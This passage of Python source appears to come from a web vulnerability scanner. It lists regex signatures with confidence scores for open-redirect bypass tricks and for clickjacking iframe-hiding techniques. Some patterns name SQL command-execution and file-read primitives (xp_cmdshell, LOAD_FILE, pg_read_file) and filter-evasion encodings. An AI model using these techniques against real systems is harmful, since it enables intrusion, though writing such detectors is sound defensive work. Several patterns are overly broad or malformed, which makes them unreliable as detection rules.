        {"desen": r"fonts\.query.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Font query redirect"},
        {"desen": r"queryLocalFonts.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Query local fonts redirect"},
        {"desen": r"fontData.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Font data redirect"},
        {"desen": r"postscriptName.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Postscript name redirect"},
        
        # Virtual Keyboard API
        {"desen": r"navigator\.virtualKeyboard.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Virtual keyboard redirect"},
        {"desen": r"virtualKeyboard\.overlaysContent.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Keyboard overlays redirect"},
        {"desen": r"geometrychange.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Geometry change redirect"},
        {"desen": r"boundingRect.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Bounding rect redirect"},
        {"desen": r"show.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Virtual keyboard show redirect"},
        
        # Window Controls Overlay API
        {"desen": r"navigator\.windowControlsOverlay.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Window controls overlay redirect"},
        {"desen": r"windowControlsOverlay\.visible.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Controls overlay visible redirect"},
        {"desen": r"getTitlebarAreaRect.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Titlebar area redirect"},
        {"desen": r"ongeometrychange.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Controls geometry change redirect"},
        {"desen": r"titlebarAreaRect.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Titlebar area rect redirect"},
        
        # Multi-Screen API
        {"desen": r"window\.getScreenDetails.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Screen details redirect"},
        {"desen": r"screenDetails.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Screen details redirect"},
        {"desen": r"screens.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Screens redirect"},
        {"desen": r"currentScreen.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Current screen redirect"},
        {"desen": r"onscreenschange.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Screens change redirect"},
        
        # Digital Goods API
        {"desen": r"getDigitalGoodsService.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Digital goods service redirect"},
        {"desen": r"getDetails.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Digital goods details redirect"},
        {"desen": r"acknowledge.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Digital goods acknowledge redirect"},
        {"desen": r"consume.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Digital goods consume redirect"},
        {"desen": r"listPurchases.*?redirect.*?https?://", "guven": 0.8, "aciklama": "List purchases redirect"},
        
        # Compute Pressure API
        {"desen": r"PressureObserver.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Pressure observer redirect"},
        {"desen": r"pressureObserver\.observe.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Pressure observe redirect"},
        {"desen": r"pressureRecord.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Pressure record redirect"},
        {"desen": r"source.*?redirect.*?https?://", "guven": 0.75, "aciklama": "Pressure source redirect"},
        {"desen": r"state.*?redirect.*?https?://", "guven": 0.75, "aciklama": "Pressure state redirect"},
        
        # Device Posture API
        {"desen": r"navigator\.devicePosture.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Device posture redirect"},
        {"desen": r"devicePosture\.type.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Posture type redirect"},
        {"desen": r"onchange.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Posture change redirect"},
        {"desen": r"continuous.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Continuous posture redirect"},
        {"desen": r"folded.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Folded posture redirect"},
        
        # Advanced patterns with multiple encoding
        {"desen": r"redirect.*?%252[Ff]%252[Ff].*?[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", "guven": 0.95, "aciklama": "Double encoded // redirect"},
        {"desen": r"redirect.*?\\u002[Ff]\\u002[Ff].*?[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", "guven": 0.95, "aciklama": "Unicode encoded // redirect"},
        {"desen": r"redirect.*?\\x2[Ff]\\x2[Ff].*?[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", "guven": 0.95, "aciklama": "Hex encoded // redirect"},
        {"desen": r"redirect.*?&#x2[Ff];&#x2[Ff];.*?[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", "guven": 0.95, "aciklama": "HTML entity encoded // redirect"},
        {"desen": r"redirect.*?%5[Cc]%5[Cc].*?[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", "guven": 0.9, "aciklama": "Encoded backslash redirect"},
        
        # Case variation bypasses
        {"desen": r"[Rr][Ee][Dd][Ii][Rr][Ee][Cc][Tt].*?[Hh][Tt][Tt][Pp]", "guven": 0.85, "aciklama": "Case variation redirect HTTP"},
        {"desen": r"[Ll][Oo][Cc][Aa][Tt][Ii][Oo][Nn].*?[Hh][Tt][Tt][Pp]", "guven": 0.85, "aciklama": "Case variation location HTTP"},
        {"desen": r"[Ww][Ii][Nn][Dd][Oo][Ww].*?[Ll][Oo][Cc][Aa][Tt][Ii][Oo][Nn]", "guven": 0.8, "aciklama": "Case variation window location"},
        {"desen": r"[Gg][Oo][Tt][Oo].*?[Uu][Rr][Ll]", "guven": 0.8, "aciklama": "Case variation goto URL"},
        {"desen": r"[Nn][Ee][Xx][Tt].*?[Uu][Rr][Ll]", "guven": 0.8, "aciklama": "Case variation next URL"},
        
        # Space and tab bypasses
        {"desen": r"redirect\s+.*?https?://", "guven": 0.85, "aciklama": "Space separated redirect"},
        {"desen": r"redirect\t+.*?https?://", "guven": 0.85, "aciklama": "Tab separated redirect"},
        {"desen": r"redirect\n+.*?https?://", "guven": 0.85, "aciklama": "Newline separated redirect"},
        {"desen": r"redirect\r+.*?https?://", "guven": 0.85, "aciklama": "Carriage return redirect"},
        {"desen": r"redirect\f+.*?https?://", "guven": 0.85, "aciklama": "Form feed redirect"},
        
        # Comment bypasses
        {"desen": r"redirect/\*.*?\*/.*?https?://", "guven": 0.9, "aciklama": "Comment bypass redirect"},
        {"desen": r"redirect//.*?\n.*?https?://", "guven": 0.9, "aciklama": "Line comment bypass redirect"},
        {"desen": r"redirect<!--.*?-->.*?https?://", "guven": 0.9, "aciklama": "HTML comment bypass redirect"},
        {"desen": r"redirect#.*?\n.*?https?://", "guven": 0.9, "aciklama": "Hash comment bypass redirect"},
        {"desen": r"redirect;.*?\n.*?https?://", "guven": 0.9, "aciklama": "Semicolon bypass redirect"},
        
        # Concatenation bypasses
        {"desen": r"redirect.*?\+.*?https?://", "guven": 0.85, "aciklama": "String concatenation redirect"},
        {"desen": r"redirect.*?&.*?https?://", "guven": 0.85, "aciklama": "Ampersand concatenation redirect"},
        {"desen": r"redirect.*?\|.*?https?://", "guven": 0.85, "aciklama": "Pipe concatenation redirect"},
        {"desen": r"redirect.*?\^.*?https?://", "guven": 0.85, "aciklama": "XOR concatenation redirect"},
        {"desen": r"redirect.*?~.*?https?://", "guven": 0.85, "aciklama": "Tilde concatenation redirect"},
        
        # Template literal bypasses
        {"desen": r"redirect.*?`.*?https?://.*?`", "guven": 0.9, "aciklama": "Template literal redirect"},
        {"desen": r"redirect.*?\$\{.*?https?://.*?\}", "guven": 0.9, "aciklama": "Template expression redirect"},
        {"desen": r"redirect.*?String\.raw`.*?https?://.*?`", "guven": 0.9, "aciklama": "String.raw template redirect"},
        {"desen": r"redirect.*?tagged`.*?https?://.*?`", "guven": 0.9, "aciklama": "Tagged template redirect"},
        {"desen": r"redirect.*?\\`.*?https?://.*?\\`", "guven": 0.9, "aciklama": "Escaped template redirect"},
        
        # Function call bypasses
        {"desen": r"redirect.*?eval\s*\(.*?https?://", "guven": 0.95, "aciklama": "Eval function redirect"},
        {"desen": r"redirect.*?Function\s*\(.*?https?://", "guven": 0.95, "aciklama": "Function constructor redirect"},
        {"desen": r"redirect.*?setTimeout\s*\(.*?https?://", "guven": 0.9, "aciklama": "setTimeout redirect"},
        {"desen": r"redirect.*?setInterval\s*\(.*?https?://", "guven": 0.9, "aciklama": "setInterval redirect"},
        {"desen": r"redirect.*?requestAnimationFrame\s*\(.*?https?://", "guven": 0.9, "aciklama": "requestAnimationFrame redirect"},
        
        # JSON bypasses
        {"desen": r"redirect.*?JSON\.parse\s*\(.*?https?://", "guven": 0.9, "aciklama": "JSON.parse redirect"},
        {"desen": r"redirect.*?JSON\.stringify\s*\(.*?https?://", "guven": 0.85, "aciklama": "JSON.stringify redirect"},
        {"desen": r"redirect.*?\{.*?\".*?https?://.*?\".*?\}", "guven": 0.85, "aciklama": "JSON object redirect"},
        {"desen": r"redirect.*?\[.*?\".*?https?://.*?\".*?\]", "guven": 0.85, "aciklama": "JSON array redirect"},
        {"desen": r"redirect.*?url.*?:.*?\".*?https?://.*?\"", "guven": 0.9, "aciklama": "JSON URL property redirect"},
        
        # Regex bypasses
        {"desen": r"redirect.*?\/.*?https?:\/\/.*?\/[gimuy]*", "guven": 0.9, "aciklama": "Regex pattern redirect"},
        {"desen": r"redirect.*?new RegExp\s*\(.*?https?://", "guven": 0.9, "aciklama": "RegExp constructor redirect"},
        {"desen": r"redirect.*?match\s*\(.*?https?://", "guven": 0.85, "aciklama": "String match redirect"},
        {"desen": r"redirect.*?replace\s*\(.*?https?://", "guven": 0.85, "aciklama": "String replace redirect"},
        {"desen": r"redirect.*?search\s*\(.*?https?://", "guven": 0.85, "aciklama": "String search redirect"},
        
        # Advanced Unicode bypasses
        {"desen": r"redirect.*?\\u[Hh][Tt][Tt][Pp]", "guven": 0.95, "aciklama": "Unicode HTTP redirect"},
        {"desen": r"redirect.*?\\u[0-9A-Fa-f]{4}.*?[0-9A-Fa-f]{4}", "guven": 0.9, "aciklama": "Full Unicode redirect"},
        {"desen": r"redirect.*?\\U[0-9A-Fa-f]{8}", "guven": 0.9, "aciklama": "32-bit Unicode redirect"},
        {"desen": r"redirect.*?\\N\{.*?\}", "guven": 0.9, "aciklama": "Named Unicode redirect"},
        {"desen": r"redirect.*?[\\u[0-9A-Fa-f]+;]+", "guven": 0.9, "aciklama": "Multiple Unicode redirect"},
        
        # CSS3 advanced redirects
        {"desen": r"@document.*?url-prefix\(.*?https?://", "guven": 0.8, "aciklama": "CSS @document redirect"},
        {"desen": r"@supports.*?url\(.*?https?://", "guven": 0.8, "aciklama": "CSS @supports redirect"},
        {"desen": r"calc\(.*?url\(.*?https?://", "guven": 0.8, "aciklama": "CSS calc() redirect"},
        {"desen": r"var\(.*?url\(.*?https?://", "guven": 0.8, "aciklama": "CSS variable redirect"},
        {"desen": r"attr\(.*?url.*?https?://", "guven": 0.8, "aciklama": "CSS attr() redirect"},
        
        # SVG advanced redirects
        {"desen": r"<image[^>]*href=['\"]https?://", "guven": 0.8, "aciklama": "SVG image href redirect"},
        {"desen": r"<use[^>]*href=['\"]https?://", "guven": 0.8, "aciklama": "SVG use href redirect"},
        {"desen": r"<animate[^>]*values.*?https?://", "guven": 0.85, "aciklama": "SVG animate redirect"},
        {"desen": r"<animateTransform[^>]*values.*?https?://", "guven": 0.85, "aciklama": "SVG animateTransform redirect"},
        {"desen": r"<foreignObject[^>]*.*?https?://", "guven": 0.85, "aciklama": "SVG foreignObject redirect"},
        
        # Advanced database redirects
        {"desen": r"UNION.*?SELECT.*?https?://", "guven": 0.9, "aciklama": "SQL UNION redirect"},
        {"desen": r"LOAD_FILE\s*\(.*?https?://", "guven": 0.95, "aciklama": "MySQL LOAD_FILE redirect"},
        {"desen": r"xp_cmdshell.*?https?://", "guven": 0.95, "aciklama": "SQL Server cmdshell redirect"},
        {"desen": r"pg_read_file\s*\(.*?https?://", "guven": 0.95, "aciklama": "PostgreSQL read file redirect"},
        {"desen": r"INTO OUTFILE.*?https?://", "guven": 0.9, "aciklama": "MySQL outfile redirect"},
        
        # WebAssembly redirects
        {"desen": r"WebAssembly\.instantiate.*?https?://", "guven": 0.85, "aciklama": "WebAssembly instantiate redirect"},
        {"desen": r"WebAssembly\.compile.*?https?://", "guven": 0.85, "aciklama": "WebAssembly compile redirect"},
],

ZafiyetTipi.CLICKJACKING: [
    {"desen": r"<iframe.*?>", "guven": 0.85, "aciklama": "Clickjacking için iframe kullanımı"},
    # Temel iframe tespit patternleri
    {"desen": r"<iframe[^>]*>", "guven": 0.85, "aciklama": "Temel iframe elementi"},
    {"desen": r"<iframe\s+src=['\"][^'\"]*['\"][^>]*>", "guven": 0.87, "aciklama": "Src özellikli iframe"},
    {"desen": r"<iframe[^>]*frameborder=['\"]0['\"][^>]*>", "guven": 0.89, "aciklama": "Gizli iframe (frameborder=0)"},
    {"desen": r"<iframe[^>]*width=['\"]1['\"][^>]*>", "guven": 0.91, "aciklama": "1 piksel genişlik iframe"},
    {"desen": r"<iframe[^>]*height=['\"]1['\"][^>]*>", "guven": 0.91, "aciklama": "1 piksel yükseklik iframe"},
    
    # CSS ile gizleme teknikleri
    {"desen": r"<iframe[^>]*style=['\"][^'\"]*opacity:\s*0[^'\"]*['\"]", "guven": 0.95, "aciklama": "Opacity ile gizlenmiş iframe"},
    {"desen": r"<iframe[^>]*style=['\"][^'\"]*visibility:\s*hidden[^'\"]*['\"]", "guven": 0.94, "aciklama": "Visibility hidden iframe"},
    {"desen": r"<iframe[^>]*style=['\"][^'\"]*display:\s*none[^'\"]*['\"]", "guven": 0.93, "aciklama": "Display none iframe"},
    {"desen": r"<iframe[^>]*style=['\"][^'\"]*position:\s*absolute[^'\"]*['\"]", "guven": 0.88, "aciklama": "Absolute positioned iframe"},
    {"desen": r"<iframe[^>]*style=['\"][^'\"]*z-index:\s*-?\d+[^'\"]*['\"]", "guven": 0.87, "aciklama": "Z-index manipülasyonu"},
    
    # Boyut manipülasyonu
    {"desen": r"<iframe[^>]*width=['\"]0['\"][^>]*>", "guven": 0.92, "aciklama": "Sıfır genişlik iframe"},
    {"desen": r"<iframe[^>]*height=['\"]0['\"][^>]*>", "guven": 0.92, "aciklama": "Sıfır yükseklik iframe"},
    {"desen": r"<iframe[^>]*style=['\"][^'\"]*width:\s*0[^'\"]*['\"]", "guven": 0.91, "aciklama": "CSS ile sıfır genişlik"},
    {"desen": r"<iframe[^>]*style=['\"][^'\"]*height:\s*0[^'\"]*['\"]", "guven": 0.91, "aciklama": "CSS ile sıfır yükseklik"},
    {"desen": r"<iframe[^>]*style=['\"][^'\"]*width:\s*1px[^'\"]*['\"]", "guven": 0.90, "aciklama": "1 piksel genişlik CSS"},
    
    # Renk manipülasyonu
    {"desen": r"<iframe[^>]*style=['\"][^'\"]*background:\s*transparent[^'\"]*['\"]", "guven": 0.89, "aciklama": "Şeffaf arka plan"},
    {"desen": r"<iframe[^>]*style=['\"][^'\"]*background-color:\s*transparent[^'\"]*['\"]", "guven": 0.89, "aciklama": "Şeffaf arka plan rengi"},
    {"desen": r"<iframe[^>]*style=['\"][^'\"]*border:\s*none[^'\"]*['\"]", "guven": 0.86, "aciklama": "Kenarlıksız iframe"},
    {"desen": r"<iframe[^>]*style=['\"][^'\"]*border:\s*0[^'\"]*['\"]", "guven": 0.86, "aciklama": "Sıfır kenarlık"},
    {"desen": r"<iframe[^>]*scrolling=['\"]no['\"][^>]*>", "guven": 0.84, "aciklama": "Scroll çubuğu devre dışı"},
    
    # JavaScript ile iframe oluşturma
    {"desen": r"document\.createElement\(['\"]iframe['\"]", "guven": 0.88, "aciklama": "JavaScript ile iframe oluşturma"},
    {"desen": r"createElement\(['\"]iframe['\"]", "guven": 0.87, "aciklama": "createElement iframe"},
    {"desen": r"\.createElement\s*\(\s*['\"]iframe['\"]", "guven": 0.87, "aciklama": "Dinamik iframe oluşturma"},
    {"desen": r"innerHTML\s*=\s*['\"][^'\"]*<iframe[^'\"]*['\"]", "guven": 0.86, "aciklama": "innerHTML ile iframe enjeksiyonu"},
    {"desen": r"outerHTML\s*=\s*['\"][^'\"]*<iframe[^'\"]*['\"]", "guven": 0.85, "aciklama": "outerHTML ile iframe"},
    
    # X-Frame-Options kontrolleri
    {"desen": r"x-frame-options", "guven": 0.70, "aciklama": "X-Frame-Options header eksikliği"},
    {"desen": r"X-Frame-Options", "guven": 0.70, "aciklama": "X-Frame-Options header (case sensitive)"},
    {"desen": r"setHeader\(['\"]X-Frame-Options['\"]", "guven": 0.65, "aciklama": "X-Frame-Options header ayarlama"},
    {"desen": r"response\.headers\[['\"]X-Frame-Options['\"]", "guven": 0.64, "aciklama": "Response header ayarlama"},
    {"desen": r"header\(['\"]X-Frame-Options:", "guven": 0.63, "aciklama": "PHP header ayarlama"},
    
    # CSP (Content Security Policy) kontrolleri
    {"desen": r"frame-ancestors\s+'none'", "guven": 0.60, "aciklama": "CSP frame-ancestors none"},
    {"desen": r"frame-ancestors\s+'self'", "guven": 0.58, "aciklama": "CSP frame-ancestors self"},
    {"desen": r"content-security-policy.*frame-ancestors", "guven": 0.62, "aciklama": "CSP ile frame koruması"},
    {"desen": r"Content-Security-Policy.*frame-ancestors", "guven": 0.62, "aciklama": "CSP header"},
    {"desen": r"<meta[^>]*http-equiv=['\"]Content-Security-Policy['\"]", "guven": 0.59, "aciklama": "Meta CSP"},
    
    # Gelişmiş CSS gizleme teknikleri
    {"desen": r"<iframe[^>]*style=['\"][^'\"]*left:\s*-\d+px[^'\"]*['\"]", "guven": 0.90, "aciklama": "Negatif left pozisyon"},
    {"desen": r"<iframe[^>]*style=['\"][^'\"]*top:\s*-\d+px[^'\"]*['\"]", "guven": 0.90, "aciklama": "Negatif top pozisyon"},
    {"desen": r"<iframe[^>]*style=['\"][^'\"]*margin-left:\s*-\d+px[^'\"]*['\"]", "guven": 0.89, "aciklama": "Negatif margin-left"},
    {"desen": r"<iframe[^>]*style=['\"][^'\"]*margin-top:\s*-\d+px[^'\"]*['\"]", "guven": 0.89, "aciklama": "Negatif margin-top"},
    {"desen": r"<iframe[^>]*style=['\"][^'\"]*clip:\s*rect\([^)]*\)[^'\"]*['\"]", "guven": 0.91, "aciklama": "CSS clip ile gizleme"},
    
    # Transform teknikleri
    {"desen": r"<iframe[^>]*style=['\"][^'\"]*transform:\s*scale\(0\)[^'\"]*['\"]", "guven": 0.93, "aciklama": "Scale(0) ile gizleme"},
    {"desen": r"<iframe[^>]*style=['\"][^'\"]*transform:\s*translateX\(-\d+px\)[^'\"]*['\"]", "guven": 0.88, "aciklama": "TranslateX ile gizleme"},
    {"desen": r"<iframe[^>]*style=['\"][^'\"]*transform:\s*translateY\(-\d+px\)[^'\"]*['\"]", "guven": 0.88, "aciklama": "TranslateY ile gizleme"},
    {"desen": r"<iframe[^>]*style=['\"][^'\"]*transform:\s*rotate\(\d+deg\)[^'\"]*['\"]", "guven": 0.85, "aciklama": "Rotate ile manipülasyon"},
    {"desen": r"<iframe[^>]*style=['\"][^'\"]*overflow:\s*hidden[^'\"]*['\"]", "guven": 0.84, "aciklama": "Overflow hidden"},
    
    # Class ve ID based gizleme
    {"desen": r"<iframe[^>]*class=['\"][^'\"]*hidden[^'\"]*['\"]", "guven": 0.87, "aciklama": "Hidden class"},
    {"desen": r"<iframe[^>]*class=['\"][^'\"]*invisible[^'\"]*['\"]", "guven": 0.86, "aciklama": "Invisible class"},
    {"desen": r"<iframe[^>]*id=['\"][^'\"]*hidden[^'\"]*['\"]", "guven": 0.85, "aciklama": "Hidden ID"},
    {"desen": r"\.hidden\s*\{[^}]*display:\s*none", "guven": 0.83, "aciklama": "Hidden class tanımı"},
    {"desen": r"\.invisible\s*\{[^}]*visibility:\s*hidden", "guven": 0.82, "aciklama": "Invisible class tanımı"},
    
    # Data attribute manipülasyonu
    {"desen": r"<iframe[^>]*data-clickjack[^>]*>", "guven": 0.88, "aciklama": "Clickjack data attribute"},
    {"desen": r"<iframe[^>]*data-hidden[^>]*>", "guven": 0.85, "aciklama": "Hidden data attribute"},
    {"desen": r"<iframe[^>]*data-overlay[^>]*>", "guven": 0.86, "aciklama": "Overlay data attribute"},
    {"desen": r"<iframe[^>]*data-transparent[^>]*>", "guven": 0.84, "aciklama": "Transparent data attribute"},
    {"desen": r"<iframe[^>]*allowtransparency=['\"]true['\"]", "guven": 0.87, "aciklama": "Allow transparency iframe"},
    
    # Sandbox attribute kontrolleri
    {"desen": r"<iframe[^>]*sandbox=['\"][^'\"]*['\"]", "guven": 0.75, "aciklama": "Sandbox attribute"},
    {"desen": r"<iframe[^>]*sandbox=['\"]allow-forms[^'\"]*['\"]", "guven": 0.80, "aciklama": "Sandbox allow-forms"},
    {"desen": r"<iframe[^>]*sandbox=['\"]allow-scripts[^'\"]*['\"]", "guven": 0.82, "aciklama": "Sandbox allow-scripts"},
    {"desen": r"<iframe[^>]*sandbox=['\"]allow-same-origin[^'\"]*['\"]", "guven": 0.81, "aciklama": "Sandbox allow-same-origin"},
    {"desen": r"<iframe[^>]*sandbox=['\"]allow-top-navigation[^'\"]*['\"]", "guven": 0.83, "aciklama": "Sandbox allow-top-navigation"},
    
    # Srcdoc ve data URI
    {"desen": r"<iframe[^>]*srcdoc=['\"][^'\"]*['\"]", "guven": 0.86, "aciklama": "Srcdoc attribute"},
    {"desen": r"<iframe[^>]*src=['\"]data:[^'\"]*['\"]", "guven": 0.89, "aciklama": "Data URI iframe"},
    {"desen": r"<iframe[^>]*src=['\"]javascript:[^'\"]*['\"]", "guven": 0.92, "aciklama": "JavaScript URI iframe"},
    {"desen": r"<iframe[^>]*src=['\"]about:blank['\"]", "guven": 0.78, "aciklama": "About:blank iframe"},
    {"desen": r"<iframe[^>]*src=['\"]['\"]", "guven": 0.76, "aciklama": "Boş src attribute"},
    
    # Mouse event manipülasyonu
    {"desen": r"pointer-events:\s*none", "guven": 0.88, "aciklama": "Pointer events none"},
    {"desen": r"<iframe[^>]*style=['\"][^'\"]*pointer-events:\s*none[^'\"]*['\"]", "guven": 0.90, "aciklama": "Iframe pointer events none"},
    {"desen": r"user-select:\s*none", "guven": 0.82, "aciklama": "User select none"},
    {"desen": r"-webkit-user-select:\s*none", "guven": 0.81, "aciklama": "Webkit user select none"},
    {"desen": r"-moz-user-select:\s*none", "guven": 0.81, "aciklama": "Mozilla user select none"},
    
    # Event handler kontrolleri
    {"desen": r"<iframe[^>]*onload=['\"][^'\"]*['\"]", "guven": 0.84, "aciklama": "Iframe onload event"},
    {"desen": r"<iframe[^>]*onerror=['\"][^'\"]*['\"]", "guven": 0.83, "aciklama": "Iframe onerror event"},
    {"desen": r"<iframe[^>]*onclick=['\"][^'\"]*['\"]", "guven": 0.87, "aciklama": "Iframe onclick event"},
    {"desen": r"<iframe[^>]*onmouseover=['\"][^'\"]*['\"]", "guven": 0.85, "aciklama": "Iframe mouseover event"},
    {"desen": r"<iframe[^>]*onfocus=['\"][^'\"]*['\"]", "guven": 0.84, "aciklama": "Iframe focus event"},
    
    # HTTPS/HTTP karışımı
    {"desen": r"<iframe[^>]*src=['\"]http://[^'\"]*['\"]", "guven": 0.79, "aciklama": "HTTP iframe HTTPS sayfada"},
    {"desen": r"<iframe[^>]*src=['\"]//[^'\"]*['\"]", "guven": 0.77, "aciklama": "Protocol-relative URL"},
    {"desen": r"<iframe[^>]*src=['\"]https://[^'\"]*['\"]", "guven": 0.72, "aciklama": "HTTPS iframe"},
    {"desen": r"<iframe[^>]*src=['\"]ftp://[^'\"]*['\"]", "guven": 0.85, "aciklama": "FTP protokolü iframe"},
    {"desen": r"<iframe[^>]*src=['\"]file://[^'\"]*['\"]", "guven": 0.88, "aciklama": "File protokolü iframe"},
    
    # Cross-origin iframe
    {"desen": r"<iframe[^>]*src=['\"]https?://(?!([^/]+\.)?%s)[^'\"]*['\"]", "guven": 0.83, "aciklama": "Cross-origin iframe"},
    {"desen": r"<iframe[^>]*src=['\"][^'\"]*\.(?:com|org|net|gov|edu)[^'\"]*['\"]", "guven": 0.78, "aciklama": "Harici domain iframe"},
    {"desen": r"<iframe[^>]*src=['\"][^'\"]*\d+\.\d+\.\d+\.\d+[^'\"]*['\"]", "guven": 0.82, "aciklama": "IP adresi iframe"},
    {"desen": r"<iframe[^>]*src=['\"]localhost[^'\"]*['\"]", "guven": 0.75, "aciklama": "Localhost iframe"},
    {"desen": r"<iframe[^>]*src=['\"]127\.0\.0\.1[^'\"]*['\"]", "guven": 0.76, "aciklama": "127.0.0.1 iframe"},
    
    # Media query manipülasyonu
    {"desen": r"@media[^{]*\{[^}]*iframe[^}]*opacity:\s*0", "guven": 0.89, "aciklama": "Media query ile gizleme"},
    {"desen": r"@media[^{]*\{[^}]*iframe[^}]*display:\s*none", "guven": 0.88, "aciklama": "Media query display none"},
    {"desen": r"@media[^{]*\{[^}]*iframe[^}]*visibility:\s*hidden", "guven": 0.87, "aciklama": "Media query visibility hidden"},
    {"desen": r"@media\s+print[^{]*\{[^}]*iframe[^}]*display:\s*none", "guven": 0.82, "aciklama": "Print media gizleme"},
    {"desen": r"@media\s+screen[^{]*\{[^}]*iframe[^}]*opacity:\s*0", "guven": 0.85, "aciklama": "Screen media gizleme"},
    
    # Keyframe animasyonları
    {"desen": r"@keyframes[^{]*\{[^}]*opacity:\s*0", "guven": 0.86, "aciklama": "Keyframe opacity animasyonu"},
    {"desen": r"animation[^;]*fadeout", "guven": 0.84, "aciklama": "Fadeout animasyonu"},
    {"desen": r"animation[^;]*hide", "guven": 0.83, "aciklama": "Hide animasyonu"},
    {"desen": r"transition[^;]*opacity", "guven": 0.81, "aciklama": "Opacity transition"},
    {"desen": r"animation-delay:\s*\d+s", "guven": 0.80, "aciklama": "Animation delay"},
    
    # Pseudo-class manipülasyonu
    {"desen": r"iframe:hover\s*\{[^}]*opacity:\s*0", "guven": 0.87, "aciklama": "Hover ile gizleme"},
    {"desen": r"iframe:focus\s*\{[^}]*visibility:\s*hidden", "guven": 0.86, "aciklama": "Focus ile gizleme"},
    {"desen": r"iframe:active\s*\{[^}]*display:\s*none", "guven": 0.85, "aciklama": "Active ile gizleme"},
    {"desen": r"iframe:visited\s*\{[^}]*opacity:\s*0", "guven": 0.84, "aciklama": "Visited ile gizleme"},
    {"desen": r"iframe:nth-child\([^)]*\)\s*\{[^}]*display:\s*none", "guven": 0.83, "aciklama": "Nth-child ile gizleme"},
    
    # CSS Grid ve Flexbox manipülasyonu
    {"desen": r"display:\s*grid[^}]*iframe[^}]*grid-area:\s*1\s*/\s*1", "guven": 0.85, "aciklama": "Grid overlay"},
    {"desen": r"display:\s*flex[^}]*iframe[^}]*position:\s*absolute", "guven": 0.84, "aciklama": "Flex absolute overlay"},
    {"desen": r"grid-template-areas[^;]*['\"][^'\"]*iframe[^'\"]*['\"]", "guven": 0.83, "aciklama": "Grid template areas"},
    {"desen": r"justify-content:\s*center[^}]*iframe[^}]*opacity:\s*0", "guven": 0.82, "aciklama": "Centered invisible iframe"},
    {"desen": r"align-items:\s*center[^}]*iframe[^}]*visibility:\s*hidden", "guven": 0.81, "aciklama": "Aligned hidden iframe"},
    
    # CSS Filter effects
    {"desen": r"<iframe[^>]*style=['\"][^'\"]*filter:\s*opacity\(0\)[^'\"]*['\"]", "guven": 0.92, "aciklama": "Filter opacity(0)"},
    {"desen": r"<iframe[^>]*style=['\"][^'\"]*filter:\s*alpha\(opacity=0\)[^'\"]*['\"]", "guven": 0.91, "aciklama": "IE Alpha filter"},
    {"desen": r"<iframe[^>]*style=['\"][^'\"]*-webkit-filter:\s*opacity\(0\)[^'\"]*['\"]", "guven": 0.90, "aciklama": "Webkit filter opacity"},
    {"desen": r"<iframe[^>]*style=['\"][^'\"]*filter:\s*blur\(\d+px\)[^'\"]*['\"]", "guven": 0.86, "aciklama": "Blur filter"},
    {"desen": r"<iframe[^>]*style=['\"][^'\"]*backdrop-filter:\s*blur\(\d+px\)[^'\"]*['\"]", "guven": 0.85, "aciklama": "Backdrop blur filter"},
    
    # JavaScript DOM manipulation
    {"desen": r"\.style\.opacity\s*=\s*['\"]?0['\"]?", "guven": 0.88, "aciklama": "JS opacity manipulation"},
    {"desen": r"\.style\.visibility\s*=\s*['\"]hidden['\"]", "guven": 0.87, "aciklama": "JS visibility manipulation"},
    {"desen": r"\.style\.display\s*=\s*['\"]none['\"]", "guven": 0.86, "aciklama": "JS display manipulation"},
    {"desen": r"\.style\.position\s*=\s*['\"]absolute['\"]", "guven": 0.83, "aciklama": "JS position manipulation"},
    {"desen": r"\.style\.zIndex\s*=\s*['\"]?-?\d+['\"]?", "guven": 0.82, "aciklama": "JS z-index manipulation"},
    
    # CSS Custom Properties (Variables)
    {"desen": r"--iframe-opacity:\s*0", "guven": 0.84, "aciklama": "CSS variable iframe opacity"},
    {"desen": r"--iframe-display:\s*none", "guven": 0.83, "aciklama": "CSS variable iframe display"},
    {"desen": r"--iframe-visibility:\s*hidden", "guven": 0.82, "aciklama": "CSS variable iframe visibility"},
    {"desen": r"var\(--iframe-opacity\)", "guven": 0.81, "aciklama": "CSS variable usage"},
    {"desen": r"calc\([^)]*\*\s*0\)", "guven": 0.80, "aciklama": "CSS calc ile sıfırlama"},
    
    # Advanced positioning
    {"desen": r"position:\s*fixed[^}]*iframe[^}]*top:\s*-\d+px", "guven": 0.89, "aciklama": "Fixed position negatif top"},
    {"desen": r"position:\s*sticky[^}]*iframe[^}]*opacity:\s*0", "guven": 0.87, "aciklama": "Sticky position gizli"},
    {"desen": r"float:\s*left[^}]*iframe[^}]*margin-left:\s*-\d+px", "guven": 0.85, "aciklama": "Float ile gizleme"},
    {"desen": r"clear:\s*both[^}]*iframe[^}]*display:\s*none", "guven": 0.83, "aciklama": "Clear ile gizleme"},
